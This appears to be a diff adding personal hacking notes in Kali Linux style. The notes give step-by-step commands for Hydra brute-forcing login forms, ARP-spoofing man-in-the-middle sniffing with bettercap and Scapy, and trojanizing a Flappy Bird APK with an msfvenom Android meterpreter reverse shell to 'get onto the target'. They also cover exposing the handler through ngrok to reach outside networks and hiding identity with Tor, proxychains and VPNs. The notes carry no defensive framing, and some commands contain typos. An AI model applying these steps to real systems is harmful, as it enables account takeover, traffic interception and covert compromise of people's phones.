+		Brute Force
+			- try random usernames and passwords to see if one is correct
+			- needs luck
+			
+			> usage
+				HYDRA
+					- built into kali linux
+					- used for brute force
+					
+					> usage
+						PAGE LINK: http://WEBSITE_NAME/WEBSITE_DIRECTORY
+							Ex. http://192.168.1.27/dvwa/login.php
+						EXAMPLE FORM CODE:
+							<form action="login.php" method="post">
+								<fieldset>
+									<label for="user">Username</label>
+									<input type="text" class="loginInput" size="20" name="USERNAME_FIELD_NAME">
+									<br/>
+									
+									<label for="pass">Password</label>
+									<input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="PASSWORD_FIELD_NAME">
+									<br/>
+									
+									<p class="submit">
+										<input type="SUBMIT_BUTTON_TYPE" value="Login" name="SUBMIT_BUTTON_NAME">
+									</p>
+								</fieldset>
+
+							</form>
+
+						1. get form code from website
+						2. type in the terminal: hydra WEBSITE_NAME http-form-post "WEBSITE_DIRECTORY: USERNAME_FIELD_NAME=^USER^ & PASSWORD_FIELD_NAME=^PASS^ & SUBMIT_BUTTON_NAME=SUBMIT_BUTTON_TYPE : STRING_INDICATING_LOGIN_FAILED" -L USERNAME_FILE -P PASSWORD_FILE
+
+
+
+
+
+
+
+
+
+
+
+Man In the Middle (MITM)
+	- goes in between a connection and act as a middle man
+	 Ex.
+	 	Take 2 machines, IP 192.168.1.10 (target), 192.168.1.7 (kali linux) and 192.168.1.1 (router)
+	 	computers forwards packets through arp tables and arp packets
+	 	like if target wants to ask for a MAC address, they send an ARP Request, and the one with the MAC address will send an ARP Response
+	 	on sending an ARP Request, all machines get the request
+	 	Say the target is looking for the router
+	 	kali linux can say that says "I am the router, 192.168.1.1"
+	 	now, target will send requests to us
+	 	if target wants to see Facebook, they will send a request to us
+	 	then we can tell the router, we are the target's IP
+	 	now, we can see all packets and information target is sending
+	 
+	 > Note
+	 	- type: cat /proc/sys/net/ipv4/ip_forward
+	 	-  this checks if arp forwarding is enabled
+	 	- 0 -> disabled, 1 -> enabled
+	 	- if output is 0, type: cat /proc/sys/net/ipv4/ip_forward
+	 	- make sure that it is enabled
+	 
+	 > usage
+	 	Bettercap
+	 		1. install bettercap: apt-get install bettercap
+	 		2. enter the bettercap framework: bettercap
+	 		3. type: help arp.spoof
+	 		4. to set targets, type: set arp.spoot.targets TARGET
+	 		5. type: set arp.spoof.fullduplex true
+	 		6. also, we will need to use net.sniff so type: nelp net.sniff
+	 		7. to set up options, type: set net.sniff.local true
+	 		8. to start the arp.spoof, type: arp.spoof on
+	 		9. to start the net.sniff, type: net.sniff on
+	 		10. to run with a file, make a file with extention ".cap" and add all commands you need
+	 		11. to run the file, type: bettercap -iface eth0 -caplet FILE.cap
+	 		
+	 		Options
+				- help MODULE -> List available commands or show module specific help if no module name is provided.
+				- active -> Show information about active modules.
+				- quit -> Close the session and exit.
+				- sleep SECONDS -> Sleep for the given amount of seconds.
+				- get NAME -> Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.
+				- set NAME VALUE -> Set the VALUE of variable NAME.
+				- read VARIABLE PROMPT -> Show a PROMPT to ask the user for input that will be saved inside VARIABLE.
+				- clear -> Clear the screen.
+				- include CAPLET -> Load and run this caplet in the current session.
+				- ! COMMAND -> Execute a shell command and print its output.
+				- alias MAC NAME -> Assign an alias to a given endpoint given its MAC address.
+		
+		Ettercap
+			- type: ettercap -G
+			- use the program
+		
+		Scapy (Python3)
+			- to start Scapy tool, type: scapy
+			
+			> Get Mac Address
+				1. type: broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+				2. type: arp_layer = ARP(pdst='192.168.1.16')
+				3. type: entire_packet = broadcast/arp_layer
+				4. type: answer = srp(entire_packet, timeout=2, verbose=True) [0]
+				5. type: print(answer[0])
+				6. the "hwsrc" is the MAC address -> e4:70:b8:39:38:93
+				7. to print just the MAC address, type: print(answer[0][1].hwsrc)
+				to store the MAC address, type: target_mac_address= answer[0][1].hwsrc
+			
+			> make malicious packet
+				1. type: packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.1.16', psrc='192.168.1.1')
+				2. type: send (packet, verbose=False)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Wireless Access Point Cracking
+
+
+
+
+
+
+
+
+
+Gaining access to an android device
+
+	MSF Framework
+		Msfvenom
+			- simply set the payload to: android/meterpreter/reverse_tcp
+			- also, for the file type, make sure you use .apk
+			- the name should be FILE.apk
+		Msfconsole
+			- set up exploit/multi/handler
+			- make sure the payload matches to the one used in msfvenom
+	
+	Evil Droid
+		- download from https://github.com/M4sc3r4n0/Evil-Droid
+		- enter the Evil-Droid folder
+		- type: chmod +x evil-droid
+		- to start the program, type: ./evil-droid
+		- it sets up all things needed
+		- can use msfvenom exploits
+		- on creating exploits, the exploit will be stored in the Evil-Droid/FILE_NAME_FOR_YOUR_EXPLOIT folder
+		- then, you can move it into the /var/www/html folder
+		- finally start the exploit
+	
+	Flappy Bird
+		1. install the APK: https://flappy-bird.en.uptodown.com/android
+		2. use the classic msfvenom exploit: msfvenom -x FLAPPY_BIRD_FILE -p android/meterpreter/reverse_tcp LHOST=KALI_IP_ADDRESS LPORT=PORT -f apk -o EXPLOIT_NAME.apk
+		3. if it doesn't work, use these commands
+			- type: sudo apt-get remove apktool
+			- install apktool by:
+				1. Download the Linux wrapper script. (Right click, Save Link As apktool)
+					- Wrapper Script - https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
+				2. Download the latest version of Apktool -> https://bitbucket.org/iBotPeaches/apktool/downloads/
+				3. Rename downloaded jar to apktool.jar
+				4. Move both apktool.jar and apktool to /usr/local/bin. (root needed)
+				5. Make sure both files are executable. (chmod +x)
+				6. Try running apktool via CLI
+			- type: sudo apt-get install zipalign
+		4. now, get the payload onto the target, and use it!
+
+
+
+
+
+
+
+
+
+Attacking a Machine Outside your network
+	> ngrok
+		1. Install ngrok
+		2. follow all instruction on the website
+		3. type in the terminal: ./ngrok tcp 5555
+		4. on loading, you will see something like this: Forwarding                    tcp://ADDRESS:ADDRESS_PORT -> localhost:LOCALHOST_PORT
+		5. remember the ADDRESS, ADDRESS_PORT and LOCALHOST_PORT
+	
+	> making exploit
+		1. type: host ADDRESS
+		2. this will tell you the IP address of ADDRESS, or ADDRESS_IP
+		3. remember ADDRESS_IP
+		4. make a payload where the IP is ADDRESS_IP and the port is ADDRESS_PORT
+	
+	> making handler
+		1. start up msfconsole
+		2. use: exploit/multi/handler
+		3. set the LHOST to: 0.0.0.0
+		4. set the LPORT to: LOCALHOST_PORT
+
+
+
+
+
+
+
+
+
+
+Anonymity
+	
+	Tor Browser
+		- anonymous
+		- sends you IP through many proxies
+		- if your IP is 10.38.28.532, it can even change to 224.241.123.129
+		- IP changes every once in a while
+		- uses DuckDuckGo
+		- is quite slow
+		
+		> Installation
+			1. type: sudo apt update
+			2. type: sudo apt-get install tor torbrowser-launcher
+			3. to run the browser, type: torbrowser-launcher
+			4. make sure you say yes to connect
+			5. "check.torproject.org" shows what IP you have in the browser
+	
+	Brave Browser
+		- anonymous
+		- install from "https://brave.com"
+	
+	Nmap through proxy
+		> Tor installation
+			1. type: apt-get install tor
+			2. to start, type: service tor start
+			3. to check tor's status, type: service tor status
+		
+		> Proxychains
+			1. to install, type: apt-get install proxychains
+			2. Please change settings, type: sudo nano /etc/proxychains.conf
+			3. where is says "#dynamic_chain", change it to "dynamic_chain"
+			4. where it says "strict_chain", change it to "#strict_chain"
+			5. at the bottom, under the "socks4" implementation, add this line: socks5 127.0.0.1 9050
+			6. proxychains setup is complete
+		
+		> Usage
+			1. to use, type: proxychain COMMAND
+			2. this fakes your IP address in nmap
+	
+	VPN
+		1. search up https://www.vpnbook.com/
+		2. scroll down to Free OpenVPN and PPTP VPN
+		3. click on OpenVPN
+		4. download any of the ones there
+		5. make sure to note the username and password written down there
+		6. unzip the file and enter the folder
+		7. open a terminal
+		8. type: openvpn --config file
+		9. if doesn't work, nano the file
+		10. after the "redirect-gateway" line, type: tls-cipher "DEFAULT:@SECLEVEL=0"
+
